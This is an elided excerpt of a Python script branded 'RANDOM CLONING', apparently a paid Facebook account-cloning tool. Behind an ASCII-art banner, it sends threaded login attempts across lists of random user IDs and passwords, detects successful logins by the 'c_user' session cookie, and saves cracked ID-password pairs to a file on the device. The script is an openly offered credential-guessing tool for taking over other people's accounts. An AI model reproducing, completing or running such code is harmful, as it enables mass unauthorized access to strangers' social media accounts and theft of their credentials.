...
def clear():
    os.system('clear')
logo =("""
 \033[1;33md88888b  .d8b.  d8888b.  .d8b.  d88888D  .d88b.  
 \033[1;32m88'     d8' `8b 88  `8D d8' `8b YP  d8' .8P  Y8. 
 \033[1;34m88ooo   88ooo88 88oobY' 88ooo88    d8'  88    88 
 \033[1;35m88~~~   88~~~88 88`8b   88~~~88   d8'   88    88 
 \033[1;36m88      88   88 88 `88. 88   88  d8' db `8b  d8' 
 \033[1;37YP      YP   YP 88   YD YP   YP d88888P  `Y88P'  
                                                 
 \033[1;31m 
\x1b[1;97m[*]----------------------------------------------
\033[1;37m[*] Author        : FARAZ KHAN
\033[1;37m[*] Github        : PR0F3SS0R-F4R4Z
\033[1;37m[*] Status        : PAID
\033[1;37m[*] TEAM         : GH0ST
\033[1;37m[*] Facebook       : FARAZ KHAN
\033[1;37m[*] Tools  Name   : RANDOM CLONING
\033[1;37m[*] version       : 2.0
\x1b[1;97m[*]----------------------------------------------
[*]----------------------------------------------
   \033[1;97m  (USE FLIGHT MOOD FOR MORE SPEED) \033[1;97m
[*]----------------------------------------------""" )
...
def KHAN():
    ...
    print('           \x1b[97m[\033[37;41m  OZA MARA SPYA   \033[0;m] ')
    print(f"")
...
def Random():
    ...
    print(logo)
    print(f"")
    print(f"          \x1b[97m[\033[37;41m  OZA  MARA LOTY   \033[0;m]")
    print(f"")
    ...
    with ThreadPool(max_workers=30) as yaari:    
        clear()
        tl = str(len(user))
        print(f" {WHITE}TOTAL IDZ             : {GREEN}"+tl)
  ...
  'schems': 'https',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[FARAZO-,OK-💚]  ' +cid+ ' | ' +ps+    '\033[0;97m')
                ...
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:156]
                print('\033[1;36m[FARAZ-CP-💔]  ' +cid+ ' | ' +ps+           ' \033[1;36m')
                open('/sdcard/FARAZ-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
                ...
                continue
        loop+=1
        sys.stdout.write('\r%s|FARAZO-OK:\033[1;32m%s\033[1;37m:\033[1;31m%s\033[1;37m '%(loop,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
